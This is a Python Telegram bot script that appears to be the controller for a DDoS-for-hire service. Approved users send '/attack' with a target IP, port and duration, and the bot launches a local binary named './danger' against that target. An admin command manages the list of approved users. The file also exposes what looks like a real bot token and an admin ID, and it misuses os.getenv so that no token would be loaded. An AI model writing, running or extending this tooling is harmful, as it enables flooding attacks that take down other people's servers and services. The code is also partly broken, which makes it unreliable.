import asyncio
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ================= CONFIG =================
TELEGRAM_BOT_TOKEN = os.getenv("8332417653:AAHhrEOu2bOUT9cwSkUaA_DKXB0zAXwsYmU")  # set in environment
ADMIN_USER_ID = 1108507810
USERS_FILE = "users.txt"

attack_lock = asyncio.Lock()

# ================= USER SYSTEM =================
def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, "w") as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

# ================= COMMANDS =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = (
        "🔥 Welcome!\n\n"
        "Use:\n"
        "/attack <ip> <port> <duration>"
    )
    await update.message.reply_text(message)

async def manage(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await update.message.reply_text("⚠️ Admin only command.")
        return

    if len(args) != 2:
        await update.message.reply_text("Usage: /manage <add|rem> <user_id>")
        return

    command, target_user_id = args

    if command == "add":
        users.add(target_user_id)
        save_users(users)
        await update.message.reply_text(f"✔ User {target_user_id} added.")
    elif command == "rem":
        users.discard(target_user_id)
        save_users(users)
        await update.message.reply_text(f"✔ User {target_user_id} removed.")

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_exec(
            "./danger",
            ip,
            port,
            duration,
            "10",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        stdout, stderr = await process.communicate()

        if stdout:
            print(stdout.decode())
        if stderr:
            print(stderr.decode())

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"Error: {e}")

    finally:
        await context.bot.send_message(chat_id=chat_id, text="✅ Task Completed")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await update.message.reply_text("⚠️ Not approved.")
        return

    if len(args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <duration>")
        return

    ip, port, duration = args

    await update.message.reply_text(
        f"⚔ Task Started\nTarget: {ip}:{port}\nDuration: {duration}s"
    )

    async with attack_lock:
        await run_attack(chat_id, ip, port, duration, context)

# ================= MAIN =================
def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("manage", manage))
    app.add_handler(CommandHandler("attack", attack))

    app.run_polling()

if __name__ == "__main__":
    main()